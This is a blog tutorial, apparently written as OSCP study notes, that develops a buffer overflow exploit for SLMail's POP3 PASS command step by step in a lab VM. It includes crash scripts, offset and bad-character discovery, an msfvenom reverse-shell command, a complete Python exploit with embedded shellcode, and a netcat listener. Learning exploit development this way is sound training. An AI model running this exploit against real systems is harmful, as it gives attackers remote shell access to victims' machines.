---
title: "OSCP: Windows Buffer Overflow"
last_modified_at: 2019-11-01T16:20:02-05:00
categories:
  - Cyber Security
tags:
  - OSCP
  - Windows
  - Buffer Overflow
---

# Windows Buffer Overflow (SLMail)
Seattle Lab Mail (SLMail) is fantastic vulnerable app to practise your buffer overflow on. You will have to download a version of the vulnerable SLMail to a Windows VM. The SLMail buffer overflow affects the **POP3 PASS** command. Both the app itself and the exploit are available on Exploit Database ([exploit][exploit])!

You will have to jump between your Kali machine (to tweak your exploit) and the Windows VM (to restart SLMail after each crash and analyze the crash in Immunity Debugger) You will need [Immunity Debugger][Immunity Debugger] to help develop your exploit.

### 1. Run Immunity Debugger, attach SLMail, run the buffer overflow and crash SLMail
We can start with the simple proof of concept above that we will modify bit-by-bit until we get a fully functional exploit that gives a reverse shell to our Kali machine.
First, on your target Windows VM: run SLMail (as admin).
Open Immunity Debugger and attach SLMail to it; Make sure that Immunity debugger is running then go to your KALI machine and run the proof-of-concept (poc.py) Python2 script shown below.

```python
import socket

# opens a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# we are sending a string of 2700 'A's
buffer = 'A' * 2700

try:
 print "\nSending buffer"
 
 # connect to the target ip and port 110
 s.connect(('10.1.1.150',110))
 data = s.recv(1024)

 # send a generic username
 s.send('USER username' +'\r\n')
 data = s.recv(1024)

 # send the buffer
 s.send('PASS ' + buffer + '\r\n')
 print "\nDone!."

# return the following message if we failed to connect
except:
 print "Could not connect to POP3!"
```

#### Run from KALI
```bash
python poc.py
```

The SLMail app should crash and the EIP register in Immunity should be filled with **41**s... the hex equivalent of the ASCII character **A** see figure below (1).

![image](/assets/images/oscp/win_buff_0.jpg "step 1")

### 2. Control EIP
Next we need to locate the exact bytes at which the Extended Instruction Pointer (EIP) is overwritten. The EIP tells the computer where in memory to execute the next command. If we can find where the EIP is we can exchange those bytes at the EIP with a memory address containing our reverse shellcode. So, instead of sending a string of 2700 **A**s, we send a specially crafted string of 2700 characters. Each sequence of 4 letters in this string is unique. We can simply determine how far along the 2700 charcaters the unique 4 letter overwrite the EIP. 
2a. We use a Metasploit script to generate the unique string as follows:
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
```
We swap out the buffer in the python script. Prior to resending the exploit we have to restart SLMail on the target and reattach to Immunity debugger. This will be the case after each exploit attempt. Now we resend with the following buffer...
```python
buffer = 'Aa0Aa1Aa2Aa3Aa4A... '
```
We see from  the figure 2a the EIP is overwritten by `39694438`. We use a similar Metasploit script to find the offset of these characters in the buffer string.
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
[*] Exact match at offset 2606
```
To check if this offset of 2606 is true we can remove the unique string buffer and send the following string.
```python
buffer = "A" * 2606 + "B" * 4 + "C" * 90 
```
As the EIP register offset is 2606 the next 4 characters **BBBB** (**42424242**) should now be at the EIP when we rerun the poc.py (see figure below, 2b). If everything has gone well, this is the case.

### 3. Make space for the shellcode (ESP)
With our current exploit the ESP points to the beginning of the string of 90 * **C**. The problem is that 90 bytes – not enough for full shellcode which will be ~350 bytes.
Can we extend buffer to 3500 to make room for shellcode? If the ESP is located at 2606 + 4. Can we add some more buffer after this to make space for the shellcode. So we retry the earlier exploit but with a longer buffer of **C**s. See below:
```python
buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)
```
The result is in the figure below (3).

![image](/assets/images/oscp/win_buff_1.JPG "step 2a, 2b, 3")

As we can see, our buffer overflow still crashes the app. We now have some space to insert our shellcode...

### 4. Discover bad characters (\0x00, \0x0D, \0x0A, etc)
We do need to ensure that no **bad characters** get sent in the buffer. We know that **A**s, **B**,s and **C**s dont seem to be an issue thus far. But what about characters like **00** that represent carriage return! We need to find all possible bad characters and ensure that our shellcode is composed without them. We can achieve this by sending a full list of all possible characters in the buffer starting from the ESP (where our shellcode will start). Immunity debugger has the ability to identify the bad characters if we simply examine the hex dump from the ESP onwards! 

We replace the long **C** string with this complete hex character list.
```python
bad chars = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28 \x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50 \x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78 \x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0 \xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8 \xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0 \xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = "A" * 2606 + "B" * 4 + badchars
```

We can identify truncations in buffer (figure beow (4). We identify the bad character **\x0a** (line feed). Remove it from the bad charcters list in the exploit. Then, rerun the exploit. We repeat this process until the app crashes with no more truncations in the hex dump. Eventually, we find the only bad characters are (**\0x00**, **\0x0D**, **\0x0A**). Our shellcode must be composed without these characters.

### 5. Redirect execution flow - Find a return address
The ESP address changes each crash. We need a reliable/accessible JMP ESP in memory. That way we can jump to it and excecute the shellcode.
Immunity debugger can execute certain modules to help find JMP ESPs in memory as SLMail runs. We must choose a module with following criteria: 
1. No memory protection such as DEP and ASLR. 
2. No bad characters in memory range.

With SLMail running. Into the Immunity debugger command line enter:
```
!mona modules
```
**!mona** module identified the SLMFC.DLL as not being affected by any memory protection schemes and not being rebased on each reboot. Therefore, the DLL will always load to same address. Use mona again to find a JMP ESP (or equivalent opcode) instruction within this DLL, and identify its memory address.  
In Immunity Debugger:
```
Use Metasploit NASM Shell ruby script to find the opcode for jmp esp.
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm > jmp esp 
FFE4
```
Now search addresses for FFE4. Remember the memory address needs to be free of bad characters. 
Back in Immunity Debugger command line.
```
!mona find –s “\xff\xe4” –m slmfc.dll
``` 	
The address **0x5f4a358f** looks good (no bad characters).
Replace the EIP (was **BBBB** previously) in the buffer string of the exploit. We must note that an x86 address-reverse little Endian and so the characters are entered in reverse.
```python
buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390 
```

If we rerun the exploit the EIP will be hit. It will point to the JMP ESP address where the buffer of **C**s (or future shellcode) will run ()see figure below (5)!

![image](/assets/images/oscp/win_buff_2.JPG "step 4 & 5")

### 6. Make shellcode excluding bad chars and insert to python script
We can create the shellcode with Metasploit tool **msfvenom**. This takes the arguments for you listening IP address (of your Kali machine, and the port you will be listening on - using netcat). The other argument of interest here is to exclude the bad characters we found earlier.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.160 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```
The resulting shellcode is 351 bytes long and will be assigned to the variable **shellcode** in the Python exploit.

### 7. Add shellcode to python script with nop sled. Get a shell
```python
buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
```
The complete exploit now looks like this:
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xdb\xde\xbb\x17\xc8\x2c\x1f\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x17\x83\xea\xfc\x03\x4d\xdb\xce\xea\x8d\x33\x8c"
"\x15\x6d\xc4\xf1\x9c\x88\xf5\x31\xfa\xd9\xa6\x81\x88\x8f\x4a"
"\x69\xdc\x3b\xd8\x1f\xc9\x4c\x69\x95\x2f\x63\x6a\x86\x0c\xe2"
"\xe8\xd5\x40\xc4\xd1\x15\x95\x05\x15\x4b\x54\x57\xce\x07\xcb"
"\x47\x7b\x5d\xd0\xec\x37\x73\x50\x11\x8f\x72\x71\x84\x9b\x2c"
"\x51\x27\x4f\x45\xd8\x3f\x8c\x60\x92\xb4\x66\x1e\x25\x1c\xb7"
"\xdf\x8a\x61\x77\x12\xd2\xa6\xb0\xcd\xa1\xde\xc2\x70\xb2\x25"
"\xb8\xae\x37\xbd\x1a\x24\xef\x19\x9a\xe9\x76\xea\x90\x46\xfc"
"\xb4\xb4\x59\xd1\xcf\xc1\xd2\xd4\x1f\x40\xa0\xf2\xbb\x08\x72"
"\x9a\x9a\xf4\xd5\xa3\xfc\x56\x89\x01\x77\x7a\xde\x3b\xda\x13"
"\x13\x76\xe4\xe3\x3b\x01\x97\xd1\xe4\xb9\x3f\x5a\x6c\x64\xb8"
"\x9d\x47\xd0\x56\x60\x68\x21\x7f\xa7\x3c\x71\x17\x0e\x3d\x1a"
"\xe7\xaf\xe8\x8d\xb7\x1f\x43\x6e\x67\xe0\x33\x06\x6d\xef\x6c"
"\x36\x8e\x25\x05\xdd\x75\xae\x20\x29\x75\x80\x5d\x2f\x75\xdd"
"\x26\xa6\x93\xb7\x48\xef\x0c\x20\xf0\xaa\xc6\xd1\xfd\x60\xa3"
"\xd2\x76\x87\x54\x9c\x7e\xe2\x46\x49\x8f\xb9\x34\xdc\x90\x17"
"\x50\x82\x03\xfc\xa0\xcd\x3f\xab\xf7\x9a\x8e\xa2\x9d\x36\xa8"
"\x1c\x83\xca\x2c\x66\x07\x11\x8d\x69\x86\xd4\xa9\x4d\x98\x20"
"\x31\xca\xcc\xfc\x64\x84\xba\xba\xde\x66\x14\x15\x8c\x20\xf0"
"\xe0\xfe\xf2\x86\xec\x2a\x85\x66\x5c\x83\xd0\x99\x51\x43\xd5"
"\xe2\x8f\xf3\x1a\x39\x14\x03\x51\x63\x3d\x8c\x3c\xf6\x7f\xd1"
"\xbe\x2d\x43\xec\x3c\xc7\x3c\x0b\x5c\xa2\x39\x57\xda\x5f\x30"
"\xc8\x8f\x5f\xe7\xe9\x85")

buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" *20 + shellcode

try:
print "\nSending buffer..."
s.connect(('10.1.1.1',110))
data = s.recv(1024)
s.send('USER username' +'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
print "\nDone!."
except:
print "Could not connect to POP3!"
```

I believe we now have a working exploit. So, lets open a netcat listener, and send the exploit.

In Kali Terminal 1
```bash
nc –nlvp 443
```

In Kali Terminal 2
```
python pop3_exploit.py
```

Hopefully, Terminal 1 will now give you your reverse shell onto the Windows VM. We have developed an exploit for any similar Windows machine running Seattle Lab Mail.

[exploit]: https://www.exploit-db.com/exploits/638
[Immunity Debugger]: https://www.immunityinc.com/products/debugger/




